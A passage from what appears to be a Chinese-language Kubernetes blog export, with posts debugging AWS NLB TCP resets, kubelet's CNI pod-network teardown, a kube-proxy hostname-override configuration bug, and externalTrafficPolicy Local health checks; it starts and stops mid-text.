的滚动更新，所以这里还有一个遗留工作留着后面找解决办法（可能不一定有。 先测试 tcp，针对 TCP 协议使用节点上的 nodeport 在将流量转发到 pod 这个后面的过程中。 基于这个描述在梳理一下调用路径 client -&gt; nlb -&gt; node -&gt; container 这个是流量进入的过程，cotnainer -&gt; node -&gt; nlb -&gt; client 这个是预期的返回路径，但是现在根据在各节点的抓包行为是 container -&gt; node -&gt; nlb 然后 nlb 冒充客户端发了 reset 给 node，node 将这个 reset 转发给了 pod；而真实客户端一致在发送 tcp 重传。 在节点上抓到的数据包： out-of-cotnainer-reset-tcp 在容器中抓到额数据包： in-container 但是在客户端抓包是发现的重传，没有发起 tcp rest。 in-container 基于上述抓包可以初步断定这个 tcp reset 非常可能是 aws 的设备冒充客户端发过来的。 nlb 的实现的问题？上述这样的现象真的让知识匮乏的我费解，Google 一下发现发现 case^Adobe 大佬的 case ，还有在 fw [^challenge ACK]的场景中有类似的行为。两个文章都提供了关键词RFC rfc5961，从文档也没有看出来有什么相关性，这个 rfc 主要是针对 tcp 的安全强化，解决几种针对的 tcp 的攻击 Blind Reset Attack Using the RST Bit Blind Reset Attack Using the SYN Bit Blind Data Injection Attack 看着上面 3 个攻击都感觉不到和我场景有什么关系，因为这一类的攻击都是针对 establish 的 tcp 信道的，而在我的 case 里面都没有建立好 tcp 链接。 细看后面的描述 Middlebox Considerations 的 section 的几个 subsection 其实和我场景也不相关，9.1 sub section 说的是某个 endpoint 发送 rst 但是 Middlebox 或者 对端实现滞后于 rfc5961，其余两个也不相关。 提了工单给 aws 了，因为的确在他的 nlb 监控上看到了 nlb-loadbalancer-rest AWS 的的回复基于 aws 的回复确认还是我的使用姿势问题，这个 tcp rest 是 natgw 发送的。 入流量 client -&gt; lb -&gt; instance -&gt; nat -&gt; pod，返回流程是 pod -&gt; nat -&gt; instance -&gt; natgw 因为保留了客户端真实来源，而 natgw 没有找到对应的条目。 reference[^challenge ACK]:[challenge ACK]|(https://www.networkdefenseblog.com/post/wireshark-tcp-challenge-ack)","tags":["k8s"]},{"title":"kubelet 是如何配合 CNI 删除容器网络","path":"/2020/06/02/how-kubelet-to-use-cni/","content":"这周协助同事解决线上CNI插件删除POD但是报错信息说 network namespace 为空，具体错误信息如下图 cni network namespace not found 看了一眼代码感觉不是我一时半会能搞定的事情，就借这个问题为契机阅读一下kubelet的部分代码，熟悉一下kubelet是如何删除POD网络，如果以后又要处理这样问题就可以有的放矢。 在线上分析可以看到kubelet的启动参数含有是 --network-plugin=cni，根据这个信息为线索梳理kubelet是如何销毁一个 pod 的network namespace 。 准备以kubelet网络部分的初始化，kubelet如何销毁POD，kubelet如何使用CNI回收网络资源这样的形式去组织这篇。 kubelet 网络部分的初始化因为匆匆打开 kubelet 代码感觉有点复杂，单纯的看销毁逻辑让我困惑为什么kubelet 调用这个 plugin 的实现，而不是那一个实现，所以计划梳理一下 kubelet 是如何启动并开始它的主流程。 kubelet 启动准备工作实在是有些多，简单整理一下调用函数直接的关系从主函数调用开始 NewKubeletCommand() -&gt; Run(kubeletServer, kubeletDeps, utilfeature.DefaultFeatureGate, stopCh)-&gt;run(s, kubeDeps, featureGate, stopCh)-&gt;RunKubelet(s, kubeDeps, s.RunOnce) 这个函数会调用createAndInitKubelet()，第二个参数是ContainerRuntimeOptions结构体，其中有个字段就是上层传下来的NetworkPluginName，在我们的case中这个值是从命令行去来的cni字符串。 123456789101112131415// RunKubelet is responsible for setting up and running a kubelet. It is used in three different applications:// 1 Integration tests// 2 Kubelet binary// 3 Standalone &#x27;kubernetes&#x27; binary// Eventually, #2 will be replaced with instances of #3func RunKubelet(kubeServer *options.KubeletServer, kubeDeps *kubelet.Dependencies, runOnce bool) error &#123;...\tk, err := createAndInitKubelet(&amp;kubeServer.KubeletConfiguration, kubeDeps, &amp;kubeServer.ContainerRuntimeOptions, // 插件名字就是这个变量的一个字段... kubeServer.NodeStatusMaxImages)\tif err != nil &#123; return fmt.Errorf(&quot;failed to create kubelet: %v&quot;, err)\t&#125; 1234567891011121314func createAndInitKubelet(kubeCfg *kubeletconfiginternal.KubeletConfiguration,\tkubeDeps *kubelet.Dependencies,\tcrOptions *config.ContainerRuntimeOptions, // 上述参数的形参...\tnodeStatusMaxImages int32) (k kubelet.Bootstrap, err error) &#123;\t// TODO: block until all sources have delivered at least one update to the channel, or break the sync loop\t// up into &quot;per source&quot; synchronizations\tk, err = kubelet.NewMainKubelet(kubeCfg, kubeDeps, crOptions, // 一路将变量传递到下面函数...\treturn k, nil&#125; 1234567891011121314151617181920212223242526// NewMainKubelet instantiates a new Kubelet object along with all the required internal modules.// No initialization of Kubelet and its modules should happen here.func NewMainKubelet(kubeCfg *kubeletconfiginternal.KubeletConfiguration,\tkubeDeps *Dependencies,\tcrOptions *config.ContainerRuntimeOptions, // container runtime 选项参数...\t// TODO: These need to become arguments to a standalone docker shim.\tpluginSettings := dockershim.NetworkPluginSettings&#123; HairpinMode: kubeletconfiginternal.HairpinMode(kubeCfg.HairpinMode), NonMasqueradeCIDR: nonMasqueradeCIDR, PluginName: crOptions.NetworkPluginName, // NetworkPluginName 变量值 cni PluginConfDir: crOptions.CNIConfDir, PluginBinDirString: crOptions.CNIBinDir, PluginCacheDir: crOptions.CNICacheDir, MTU: int(crOptions.NetworkPluginMTU),\t&#125;... switch containerRuntime &#123;\tcase kubetypes.DockerContainerRuntime: // 这个值是 docker，也就是我们场景的值 // Create and start the CRI shim running as a grpc server. streamingConfig := getStreamingConfig(kubeCfg, kubeDeps, crOptions) ds, err := dockershim.NewDockerService(kubeDeps.DockerClientConfig, crOptions.PodSandboxImage, streamingConfig, &amp;pluginSettings, runtimeCgroups, kubeCfg.CgroupDriver, crOptions.DockershimRootDirectory, !crOptions.RedirectContainerStreaming, crOptions.NoJsonLogPath) // pluginSettings 里面含有 network plugin 名称...\treturn klet, nil&#125; 在NewDockerService函数中会调用InitNetworkPlugin函数，这个函数是构建dockerservice网络字段的关键。 123456789101112131415// NewDockerService creates a new `DockerService` struct.// NOTE: Anything passed to DockerService should be eventually handled in another way when we switch to running the shim as a different process.func NewDockerService(config *ClientConfig, podSandboxImage string, streamingConfig *streaming.Config, pluginSettings *NetworkPluginSettings,\tcgroupsName string, kubeCgroupDriver string, dockershimRootDir string, startLocalStreamingServer bool, noJsonLogPath string) (DockerService, error) &#123;...\tds := &amp;dockerService&#123;...\tplug, err := network.InitNetworkPlugin(cniPlugins, pluginSettings.PluginName, netHost, pluginSettings.HairpinMode, pluginSettings.NonMasqueradeCIDR, pluginSettings.MTU) // 这个函数是构建 plugin 接口的关键\tif err != nil &#123; return nil, fmt.Errorf(&quot;didn&#x27;t find compatible CNI plugin with given settings %+v: %v&quot;, pluginSettings, err)\t&#125;\tds.network = network.NewPluginManager(plug) // DockerService 的 network 字段...\treturn ds, nil&#125; 多数场景 kubelet 指定 plugin 名字为 cni 或者 kubenet 足够了，这个初始化的逻辑就是在这个调用中 network.InitNetworkPlugin(cniPlugins, pluginSettings.PluginName, netHost, pluginSettings.HairpinMode, pluginSettings.NonMasqueradeCIDR, pluginSettings.MTU)，可以在 kubelet的目录下面看到 cni 和 kubenet 两个包实现了 plugin interface。 我认为为了处理POD删除时候网络问题对启动流程分析到这里就足够了，知道了如何kubelet初始化准备调用 cni 的实现。 kubelet 调用网络接口抽象在上面初始化的过程中可以看到设置dockerservice的plugin，plugin interface设计主要关注两个接口一个是SetUpPod，还有一个是TearDownPod。 看注释可能要额外注意，在这个两个接口的设计中都有对infra container预设前提，具体可以看一下注释。 123456789101112// NetworkPlugin is an interface to network plugins for the kubelettype NetworkPlugin interface &#123;...\t// SetUpPod is the method called after the infra container of\t// the pod has been created but before the other containers of the\t// pod are launched. // 看上面注释，这个函数就是用来准备 POD 运行时的网络环境的\tSetUpPod(namespace string, name string, podSandboxID kubecontainer.ContainerID, annotations, options map[string]string) error\t// TearDownPod is the method called before a pod&#x27;s infra container will be deleted // 这个函数是用在 POD 销毁的流程中的，但是在接口设计中有假设在 infra container 被销毁前\tTearDownPod(namespace string, name string, podSandboxID kubecontainer.ContainerID) error kubelet 如何销毁容器前面看了kubelet启动初始化，出于文章的完整性考虑梳理一下POD销毁场景下几个主要函数的调用关系。 在最开始kubelet启动的时候知道了函数调用到RunKubelet()，后面其实还有RunKubelet()-&gt;startKubelet()-&gt;k.Run(podCfg.Updates()) 1234567// Run starts the kubelet reacting to config updatesfunc (kl *Kubelet) Run(updates &lt;-chan kubetypes.PodUpdate) &#123;...\t// Start the pod lifecycle event generator.\tkl.pleg.Start()\tkl.syncLoop(updates, kl) // 这个地方就是 kubelet 实际运行的核心代码了&#125; 在 syncLoop 中根据收到的事件进行处理就是kubelet核心逻辑，这里只关注pod是如何开始删除的。 123456789func (kl *Kubelet) syncLoopIteration(configCh &lt;-chan kubetypes.PodUpdate, handler SyncHandler,\tsyncCh &lt;-chan time.Time, housekeepingCh &lt;-chan time.Time, plegCh &lt;-chan *pleg.PodLifecycleEvent) bool &#123;\tselect &#123;... switch u.Op &#123; // 这里对操作类型做断言，不通的类型对应不同的处理函数。... case kubetypes.REMOVE: klog.V(2).Infof(&quot;SyncLoop (REMOVE, %q): %q&quot;, u.Source, format.Pods(u.Pods)) handler.HandlePodRemoves(u.Pods) 这个syncLoopIteration函数告诉你从几个渠道触发主循环，handler变量存放这处理这些事件的方法，可以看一下部分实现（这个函数的注释写的很清楚，告诉你每个 channel 里面是什么） 123456789101112131415161718// HandlePodRemoves is the callback in the SyncHandler interface for pods// being removed from a config source.func (kl *Kubelet) HandlePodRemoves(pods []*v1.Pod) &#123; start := kl.clock.Now() for _, pod := range pods &#123; kl.podManager.DeletePod(pod) if kubetypes.IsMirrorPod(pod) &#123; kl.handleMirrorPod(pod, start) continue &#125; // Deletion is allowed to fail because the periodic cleanup routine // will trigger deletion again. if err := kl.deletePod(pod); err != nil &#123; // 这里就是删除 POD 的核心 klog.V(2).Infof(&quot;Failed to delete pod %q, err: %v&quot;, format.Pod(pod), err) &#125; kl.probeManager.RemovePod(pod) &#125;&#125; deletePod()函数其实并不是真的deletePOD仅仅是将期望被删除的POD丢掉podKillingCh中。 12345678910111213141516// deletePod deletes the pod from the internal state of the kubelet by:// 1. stopping the associated pod worker asynchronously// 2. signaling to kill the pod by sending on the podKillingCh channel//// deletePod returns an error if not all sources are ready or the pod is not// found in the runtime cache.func (kl *Kubelet) deletePod(pod *v1.Pod) error &#123;... podPair := kubecontainer.PodPair&#123;APIPod: pod, RunningPod: &amp;runningPod&#125; kl.podKillingCh &lt;- &amp;podPair // 这里 // TODO: delete the mirror pod here? // We leave the volume/directory cleanup to the periodic cleanup routine. return nil&#125; 根据这个 channel 找到删除流程的代码，这个代码是以一个go routing 独立运行go wait.Until(kl.podKiller, 1*time.Second, wait.NeverStop)。 1234567891011// podKiller launches a goroutine to kill a pod received from the channel if// another goroutine isn&#x27;t already in action.func (kl *Kubelet) podKiller() &#123;...\tfor podPair := range kl.podKillingCh &#123; // 这地方可以看到通过 channel 沟通... if !exists &#123; go func(apiPod *v1.Pod, runningPod *kubecontainer.Pod) &#123; klog.V(2).Infof(&quot;Killing unwanted pod %q&quot;, runningPod.Name) err := kl.killPod(apiPod, runningPod, nil, nil) // 这里就是做实际的删除... 看下面代码知道了实际调用了containerRuntime的KillPod接口 1234567// One of the following arguments must be non-nil: runningPod, status.// TODO: Modify containerRuntime.KillPod() to accept the right arguments.func (kl *Kubelet) killPod(pod *v1.Pod, runningPod *kubecontainer.Pod, status *kubecontainer.PodStatus, gracePeriodOverride *int64) error &#123;...\t// Call the container runtime KillPod method which stops all running containers of the pod\tif err := kl.containerRuntime.KillPod(pod, p, gracePeriodOverride); err != nil &#123; // here... 看一下KillPod这个interface的实现如下，没有没有太多核心逻辑 1234567// KillPod kills all the containers of a pod. Pod may be nil, running pod must not be.// gracePeriodOverride if specified allows the caller to override the pod default grace period.// only hard kill paths are allowed to specify a gracePeriodOverride in the kubelet in order to not corrupt user data.// it is useful when doing SIGKILL for hard eviction scenarios, or max grace period during soft eviction scenarios.func (m *kubeGenericRuntimeManager) KillPod(pod *v1.Pod, runningPod kubecontainer.Pod, gracePeriodOverride *int64) error &#123;\terr := m.killPodWithSyncResult(pod, runningPod, gracePeriodOverride)... 123456789101112131415161718192021// killPodWithSyncResult kills a runningPod and returns SyncResult.// Note: The pod passed in could be *nil* when kubelet restarted.func (m *kubeGenericRuntimeManager) killPodWithSyncResult(pod *v1.Pod, runningPod kubecontainer.Pod, gracePeriodOverride *int64) (result kubecontainer.PodSyncResult) &#123;\tkillContainerResults := m.killContainersWithSyncResult(pod, runningPod, gracePeriodOverride)\tfor _, containerResult := range killContainerResults &#123; result.AddSyncResult(containerResult)\t&#125;\t// stop sandbox, the sandbox will be removed in GarbageCollect\tkillSandboxResult := kubecontainer.NewSyncResult(kubecontainer.KillPodSandbox, runningPod.ID)\tresult.AddSyncResult(killSandboxResult)\t// Stop all sandboxes belongs to same pod\tfor _, podSandbox := range runningPod.Sandboxes &#123; if err := m.runtimeService.StopPodSandbox(podSandbox.ID.ID); err != nil &#123; // 这里是删除 POD 的 sandbox killSandboxResult.Fail(kubecontainer.ErrKillPodSandbox, err.Error()) klog.Errorf(&quot;Failed to stop sandbox %q&quot;, podSandbox.ID) &#125;\t&#125;\treturn&#125; killContainersWithSyncResult() 方法的实现就是从POD的操作转换为 container 操作的核心，在这个函数之前全部操作都是围绕这个POD，但是这个函数之后调用函数操作对象都是 container。 而且这个函数保证了others conainter删除早于 sandbox container删除。 后面函数调用就比较简单了m.killContainersWithSyncResult(pod, runningPod, gracePeriodOverride) -&gt; m.runtimeService.StopPodSandbox(podSandbox.ID.ID) -&gt; r.runtimeClient.StopPodSandbox(ctx, &amp;runtimeapi.StopPodSandboxRequest&#123;PodSandboxId: podSandBoxID&#125;)。 对删除流程我们跟到这个StopPodSandbox方法调用我认为就够了，之所以认为够了是原因在此之前逻辑都是在kubelet自己主循环中，而之后的逻辑都是走的 grpc。 kubelet 如何回收网络有了之前的分析，现在看一下是如何实现StopPodSandbox 这个服务是如何实现的 123456789var _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;\tServiceName: &quot;runtime.v1alpha2.RuntimeService&quot;,\tHandlerType: (*RuntimeServiceServer)(nil),\tMethods: []grpc.MethodDesc&#123;... &#123; MethodName: &quot;StopPodSandbox&quot;, Handler: _RuntimeService_StopPodSandbox_Handler, &#125;, _RuntimeService_StopPodSandbox_Handler的实现会调用StopPodSandbox()，后面看一下StopPodSandbox()的实现。 1234567891011121314151617181920212223// StopPodSandbox stops the sandbox. If there are any running containers in the// sandbox, they should be force terminated.// TODO: This function blocks sandbox teardown on networking teardown. Is it// better to cut our losses assuming an out of band GC routine will cleanup// after us?func (ds *dockerService) StopPodSandbox(ctx context.Context, r *runtimeapi.StopPodSandboxRequest) (*runtimeapi.StopPodSandboxResponse, error) &#123;\tvar namespace, name string\tvar hostNetwork bool....\t// WARNING: The following operations made the following assumption:\t// 1. kubelet will retry on any error returned by StopPodSandbox.\t// 2. tearing down network and stopping sandbox container can succeed in any sequence.\t// This depends on the implementation detail of network plugin and proper error handling.\t// For kubenet, if tearing down network failed and sandbox container is stopped, kubelet\t// will retry. On retry, kubenet will not be able to retrieve network namespace of the sandbox\t// since it is stopped. With empty network namespcae, CNI bridge plugin will conduct best\t// effort clean up and will not return error.\terrList := []error&#123;&#125;\tready, ok := ds.getNetworkReady(podSandboxID)\tif !hostNetwork &amp;&amp; (ready || !ok) &#123; // Only tear down the pod network if we haven&#x27;t done so already cID := kubecontainer.BuildContainerID(runtimeName, podSandboxID) err := ds.network.TearDownPod(namespace, name, cID) TearDownPod就是整个POD网络销毁的核心函数，在这个函数的实现中做了一部分预设前提 infra container 后于 others container 删除。 看一下CNI这个包对与这个函数的实现的销毁逻辑 12345678910111213func (plugin *cniNetworkPlugin) TearDownPod(namespace string, name string, id kubecontainer.ContainerID) error &#123;\tif err := plugin.checkInitialized(); err != nil &#123; return err\t&#125;\t// Lack of namespace should not be fatal on teardown\tnetnsPath, err := plugin.host.GetNetNS(id.ID) // 这里就就是获取 namespace 的使用\tif err != nil &#123; klog.Warningf(&quot;CNI failed to retrieve network namespace path: %v&quot;, err) // 看 ELK 报错信息有这个\t&#125;...\treturn plugin.deleteFromNetwork(cniTimeoutCtx, plugin.getDefaultNetwork(), name, namespace, id, netnsPath, nil)&#125; 1234func (plugin *cniNetworkPlugin) deleteFromNetwork(ctx context.Context, network *cniNetwork, podName string, podNamespace string, podSandboxID kubecontainer.ContainerID, podNetnsPath string, annotations map[string]string) error &#123;\trt, err := plugin.buildCNIRuntimeConf(podName, podNamespace, podSandboxID, podNetnsPath, annotations, nil) // 通过 ELK 看到也有这个函数的警告...&#125; 1234567func (plugin *cniNetworkPlugin) buildCNIRuntimeConf(podName string, podNs string, podSandboxID kubecontainer.ContainerID, podNetnsPath string, annotations map[string]string) (*libcni.RuntimeConf, error) &#123;\tglog.V(4).Infof(&quot;Got netns path %v&quot;, podNetnsPath)\tglog.V(4).Infof(&quot;Using podns path %v&quot;, podNs) // 这行在 ELK 里面也看到了，podNs 值为 default 不符合预期 3...\treturn rt, nil&#125; 这后面就是按照cni的标准调用cni二进制了。 问题分析基于之前的分析，其实出问题的地方很清楚了。就是plugin.host.GetNetNS(id.ID)过程错误了。 12345678910// GetNetNS returns the network namespace of the given containerID. The ID// supplied is typically the ID of a pod sandbox. This getter doesn&#x27;t try// to map non-sandbox IDs to their respective sandboxes.func (ds *dockerService) GetNetNS(podSandboxID string) (string, error) &#123;\tr, err := ds.client.InspectContainer(podSandboxID) // 这个就是调用 docker client 了\tif err != nil &#123; return &quot;&quot;, err\t&#125;\treturn getNetworkNamespace(r)&#125; 1234567func (d *kubeDockerClient) InspectContainer(id string) (*dockertypes.ContainerJSON, error) &#123;\tctx, cancel := d.getTimeoutContext()\tdefer cancel()\tcontainerJSON, err := d.client.ContainerInspect(ctx, id) // 这个地方就是...\treturn &amp;containerJSON, nil&#125; 12345678func getNetworkNamespace(c *dockertypes.ContainerJSON) (string, error) &#123; if c.State.Pid == 0 &#123; // Docker reports pid 0 for an exited container. return &quot;&quot;, fmt.Errorf(&quot;cannot find network namespace for the terminated container %q&quot;, c.ID) &#125; // dockerNetNSFmt = &quot;/proc/%v/ns/net&quot; return fmt.Sprintf(dockerNetNSFmt, c.State.Pid), nil &#125; 结合ELK错误日志初步判断出就是if c.State.Pid == 0 &#123;这个逻辑被触发了，也就说 sandbox的 container 的docker state pid为0。","tags":["k8s"]},{"title":"kube-proxy 配置不当导致 service 异常","path":"/2020/05/25/kube-proxy-configure-error/","content":"之前调研 nlb 后端获取真实 ip 的特性，发现当 kube-proxy 报错如下的时候就会发生生成的 iptables 规则不符合预期，即丢弃当前 service node port 的流量。 1-A KUBE-XLB-HCMTY43AHEJZZDHI -m comment --comment &quot;2048-game/service-2048: has no local endpoints&quot; -j KUBE-MARK-DROP 实际情况是当前节点上运行着 pod 12345$ kubectl --kubeconfig kubeconfig -n 2048-game get pod -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE2048-deployment-7bddb7dc45-c2dk6 1/1 Running 0 109m 10.188.166.183 ip-10-188-166-140.ec2.internal &lt;none&gt;2048-deployment-7bddb7dc45-nc88f 1/1 Running 0 109m 10.188.166.232 ip-10-188-166-140.ec2.internal &lt;none&gt; 而 kubelet 的健康检查却说没有 12345678# curl http://10.188.166.140:32198&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048&quot;\t&#125;,\t&quot;localEndpoints&quot;: 0&#125; 错误信息收集检查 kube-proxy 日志发现是 kube-proxy 解析 ip 地址有报错信息 123W0525 07:13:03.916890 1 server.go:604] Failed to retrieve node info: nodes &quot;ip-10-188-166-140&quot; not foundI0525 07:13:03.916921 1 server_others.go:148] Using iptables Proxier.W0525 07:13:03.917047 1 proxier.go:312] invalid nodeIP, initializing kube-proxy with 127.0.0.1 as nodeIP 在 kube-proxy 的逻辑中，这个 ip 地址需要和 endpoint 对象中的 nodeName 做里面的地址匹配 1234567891011121314....subsets:- addresses: - ip: 10.188.166.183 nodeName: ip-10-188-166-140.ec2.internal targetRef: kind: Pod name: 2048-deployment-7bddb7dc45-c2dk6 namespace: 2048-game resourceVersion: &quot;1695104&quot; uid: e52b247a-9e51-11ea-b101-02d6ecb85825 - ip: 10.188.166.232 nodeName: ip-10-188-166-140.ec2.internal ... 看下 kube-proxy 的启动关键参数 12345...I0525 07:13:03.848460 1 flags.go:33] FLAG: --bind-address=&quot;0.0.0.0&quot;...I0525 07:13:03.848697 1 flags.go:33] FLAG: --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;... 代码逻辑分析12345678910111213141516171819func NewProxier(ipt utiliptables.Interface,\tsysctl utilsysctl.Interface,\texec utilexec.Interface,\tsyncPeriod time.Duration,\tminSyncPeriod time.Duration,\tmasqueradeAll bool,\tmasqueradeBit int,\tclusterCIDR string,\thostname string,\tnodeIP net.IP,\trecorder record.EventRecorder,\thealthzServer healthcheck.HealthzUpdater,\tnodePortAddresses []string,) (*Proxier, error) &#123;...\tif nodeIP == nil &#123; glog.Warningf(&quot;invalid nodeIP, initializing kube-proxy with 127.0.0.1 as nodeIP&quot;) // 错误信息 nodeIP = net.ParseIP(&quot;127.0.0.1&quot;)\t&#125; 12345678910111213nodeIP := net.ParseIP(config.BindAddress) // 这里通过日志看到的输入 0.0.0.0if nodeIP.IsUnspecified() &#123; // 这里逻辑应该是命中了，为 true\tnodeIP = getNodeIP(client, hostname)&#125;if proxyMode == proxyModeIPTables &#123;\tglog.V(0).Info(&quot;Using iptables Proxier.&quot;)\tif config.IPTables.MasqueradeBit == nil &#123; // MasqueradeBit must be specified or defaulted. return nil, fmt.Errorf(&quot;unable to read IPTables MasqueradeBit from config&quot;)\t&#125;\t// TODO this has side effects that should only happen when Run() is invoked.\tproxierIPTables, err := iptables.NewProxier( 1234567891011121314func getNodeIP(client clientset.Interface, hostname string) net.IP &#123;\tvar nodeIP net.IP\tnode, err := client.CoreV1().Nodes().Get(hostname, metav1.GetOptions&#123;&#125;)\tif err != nil &#123; glog.Warningf(&quot;Failed to retrieve node info: %v&quot;, err) // 这个错误信息也命中，值为 ip-10-188-166-140 return nil\t&#125;\tnodeIP, err = utilnode.GetNodeHostIP(node)\tif err != nil &#123; glog.Warningf(&quot;Failed to retrieve node IP: %v&quot;, err) return nil\t&#125;\treturn nodeIP&#125; 这个错误信息就很奇怪，明明前面已经启动了 --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;，为啥还是去获取的主机名称是ip-10-188-166-140。 12345// Create event recorderchostname, err := utilnode.GetHostname(config.HostnameOverride)if err != nil &#123;\treturn nil, err&#125; 看到了变量产生的地方，这个函数utilnode.GetHostname()经过单元测试utilnode.GetHostname(ip-10-188-166-140.ec2.internal)返回值是ip-10-188-166-140.ec2.internal，也是符合预期的。 那就顺藤排查config.HostnameOverride变量，发现是如下的命令行参数渲染上来的 1fs.StringVar(&amp;o.config.HostnameOverride, &quot;hostname-override&quot;, o.config.HostnameOverride, &quot;If non-empty, will use this string as identification instead of the actual hostname.&quot;) 有点迷，不能跳着看。 继续看config.HostnameOverride这个变量的结构体config生成。 12345678910111213141516func newProxyServer(\tconfig *proxyconfigapi.KubeProxyConfiguration,\tcleanupAndExit bool,\tcleanupIPVS bool,\tscheme *runtime.Scheme,\tmaster string) (*ProxyServer, error) &#123;\tif config == nil &#123; return nil, errors.New(&quot;config is required&quot;)\t&#125;... 移除不相关代码\t// Create event recorderc\thostname, err := utilnode.GetHostname(config.HostnameOverride)\tif err != nil &#123; return nil, err\t&#125; 走读如上代码发现是发现config对象其实是参数传入的，并且没有特别的修改。 1234// NewProxyServer returns a new ProxyServer.func NewProxyServer(o *Options) (*ProxyServer, error) &#123;\treturn newProxyServer(o.config, o.CleanupAndExit, o.CleanupIPVS, o.scheme, o.master)&#125; 调用 NewProxyServer()函数的是Run()中被调用，走读了一下没有发现异常。继续看一下Run()函数被调用的地方 12345678func (o *Options) Run() error &#123;\tif len(o.WriteConfigTo) &gt; 0 &#123; return o.writeConfigFile()\t&#125;\tproxyServer, err := NewProxyServer(o)...&#125; Run() 是NewOptions()返回对象的方法， 123456789101112131415161718192021222324252627282930313233343536// NewProxyCommand creates a *cobra.Command object with default parametersfunc NewProxyCommand() *cobra.Command &#123;\topts := NewOptions()\tcmd := &amp;cobra.Command&#123; ... Run: func(cmd *cobra.Command, args []string) &#123; verflag.PrintAndExitIfRequested() utilflag.PrintFlags(cmd.Flags()) if err := initForOS(opts.WindowsService); err != nil &#123; glog.Fatalf(&quot;failed OS init: %v&quot;, err) &#125; if err := opts.Complete(); err != nil &#123; glog.Fatalf(&quot;failed complete: %v&quot;, err) &#125; if err := opts.Validate(args); err != nil &#123; glog.Fatalf(&quot;failed validate: %v&quot;, err) &#125; glog.Fatal(opts.Run()) &#125;,\t&#125;\tvar err error\topts.config, err = opts.ApplyDefaults(opts.config)\tif err != nil &#123; glog.Fatalf(&quot;unable to create flag defaults: %v&quot;, err)\t&#125;\topts.AddFlags(cmd.Flags())\tcmd.MarkFlagFilename(&quot;config&quot;, &quot;yaml&quot;, &quot;yml&quot;, &quot;json&quot;)\treturn cmd&#125; 看上面代码知道NewProxyCommand返回的是*cobra.Command对象，这个框架中实际执行的就是Run字段的实现。 1234567891011121314151617181920212223// Complete completes all the required options.func (o *Options) Complete() error &#123;\tif len(o.ConfigFile) == 0 &amp;&amp; len(o.WriteConfigTo) == 0 &#123; glog.Warning(&quot;WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP.&quot;) o.applyDeprecatedHealthzPortToConfig()\t&#125;\t// Load the config file here in Complete, so that Validate validates the fully-resolved config.\tif len(o.ConfigFile) &gt; 0 &#123; if c, err := o.loadConfigFromFile(o.ConfigFile); err != nil &#123; // 这里覆盖了 return err &#125; else &#123; o.config = c &#125;\t&#125;\terr := utilfeature.DefaultFeatureGate.SetFromMap(o.config.FeatureGates)\tif err != nil &#123; return err\t&#125;\treturn nil&#125; 看了上面代码心凉了，也就是说如果我指定了配置文件那么命令行设置的flag也就不生效了。 验证结论12345678910/usr/local/bin/kube-proxy --hostname-override=ip-10-188-166-140.ec2.internal --v=8...I0525 10:19:12.711084 1543 flags.go:33] FLAG: --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;...W0525 10:19:12.711412 1543 server.go:194] WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP.I0525 10:19:12.711447 1543 feature_gate.go:206] feature gates: &amp;&#123;map[]&#125;I0525 10:19:12.713822 1543 iptables.go:611] couldn&#x27;t get iptables-restore version; assuming it doesn&#x27;t support --waitI0525 10:19:12.721048 1543 server.go:412] Neither kubeconfig file nor master URL was specified. Falling back to in-cluster config.W0525 10:19:12.722352 1543 server_others.go:295] Flag proxy-mode=&quot;&quot; unknown, assuming iptables proxyI0525 10:19:12.723544 1543 round_trippers.go:383] GET https://192.168.0.1:443/api/v1/nodes/ip-10-188-166-140.ec2.internal 符合代码分析，凡事指定config就以这个配置文件的内容为准，没有就以命令行的flag为准。 后面又看了一下kubelet的配置参数，发现在 kubelet设计中如果falg和 配置文件中同时指定，命令行参数设定值具有更高的优先级。 看上去是个上游bug，在当前最新版本有没有这样的问题有待确认。","tags":["k8s"]},{"title":"service externalTrafficPolicy 探究","path":"/2020/05/20/service-traffic-local/","content":"因为业务需要在POD中获取客户端的正式地址，通过调研发现只要创建service的是spec.externalTrafficPolicy 字段指定为Local即可。 这片文章探究一下Local这个字段是如何实现的。 创建一个 service 展示如下，之所以使用 nlb 是因为 aws 的 nlb是可以透传客户端原地址。 12345678910111213141516apiVersion: v1kind: Servicemetadata: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb name: &quot;service-2048-local&quot; namespace: &quot;2048-game&quot;spec: type: LoadBalancer externalTrafficPolicy: Local ports: - port: 80 targetPort: 80 protocol: TCP selector: name: &quot;2048-game&quot; 123$ kubectl --kubeconfig kubeconfig -n 2048-game get svc -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORservice-2048-local LoadBalancer 192.168.104.28 a7c77732499c111ea9b5f02d6ecb8582-1465649123.us-east-1.elb.amazonaws.com 80:30636/TCP 22h name=2048-game service 的 externalTrafficPolicy的默认配置是ClusterIP，如果使用默认的值，出于对kubernetes与cloud-provider-aws的理解，我知道当我流量通过 nlb会被 targetgroup转发到机器的nodeport，然后被转发到目标容器中。 如果指定了 externalTrafficPolicy 为 local可以将流量转发只会被转发到运行POD的节点上。在 AWS 上做到这样的效果是得益于nlb的健康检查，targetgroup的健康检查会发现没有运行 POD 的healthCheck端口是不通的。 targetgroup k8s 是如何实现通过 service的文件我知道了健康检查端口是30965，在集群的两个节点上探查健康检查的端口 12345678# curl http://10.188.166.140:30965//healthz&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048-local&quot;\t&#125;,\t&quot;localEndpoints&quot;: 2&#125; 12345678# curl http://10.188.166.141:30965//healthz&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048-local&quot;\t&#125;,\t&quot;localEndpoints&quot;: 0&#125; kube-proxy就根据上面的两个地方的差异生成不同的 iptables规则，如果当前节点健康检查localEndpoints不为0，那么当前节点就会生成转发规则指向目标容器，如果没有就生成DROP规则丢弃nlb的健康检查，这样流量就不会被转发到这个没有运行POD的节点上。 运行 POD 节点的转发规则当前的 service的externalTrafficPolicy为local 1234567891011121314151617# 